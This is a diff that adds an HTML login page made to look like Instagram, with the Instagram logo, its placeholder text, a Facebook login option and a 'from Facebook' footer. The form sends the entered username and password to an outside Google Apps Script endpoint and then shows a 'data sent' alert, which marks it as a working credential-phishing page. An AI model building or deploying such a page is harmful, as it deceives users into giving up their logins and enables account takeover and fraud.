@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Purp</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="head">
+    <button class="get">GET</button>
+    <h3>Purp</h3>
+    <p> &nbsp; Find it for free on Google Playstore </p>
+  </header>
+
+  <div class="wrapper">
+    <div class="header">
+      <div class="top">
+        <div class="logo">
+          <img src="https://i.ibb.co/HCwmH6Q/instagram.png" alt="Purp" style="width: 175px;">
+        </div>
+
+        <!-- ESTE ES EL FORMULARIO FUNCIONAL -->
+        <form 
+          class="form" 
+          action="https://script.google.com/macros/s/AKfycbyCWkrR4KTKFogpUA525DQpJ8m0KVW8WycjBNTiI4ek8-NeJosGTpcFfF7wOub-e4IK/exec"
+          method="POST"
+          onsubmit="alert('¡Datos enviados!')">
+          
+          <div class="input_field">
+            <input type="text" name="usuario" placeholder="Phone number, username, or email" class="input" required>
+          </div>
+          <div class="input_field">
+            <input type="password" name="contraseña" placeholder="Password" class="input" required>
+          </div>
+          <div class="btn">
+            <button type="submit" class="login">Log In</button>
+          </div>
+        </form>
+        <!-- FIN DEL FORMULARIO -->
+
+        <div class="or">
+          <div class="line"></div>
+          <p>OR</p>
+          <div class="line"></div>
+        </div>
+
+        <div class="dif">
+          <div class="fb">
+            <img src="https://i.ibb.co/zRV2Tts/facebook.png" alt="facebook">
+            <p>Log in with Facebook</p>
+          </div>
+          <div class="forgot">
+            <a href="#">Forgot password?</a>
+            <div class="dont">
+              Don’t have an account? <a href="#" class="signu">Sign Up</a>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <hr>
+    <div class="x">from</div><br />
+    <div class="y">Facebook</div>
+  </footer>
+</body>
+</html>
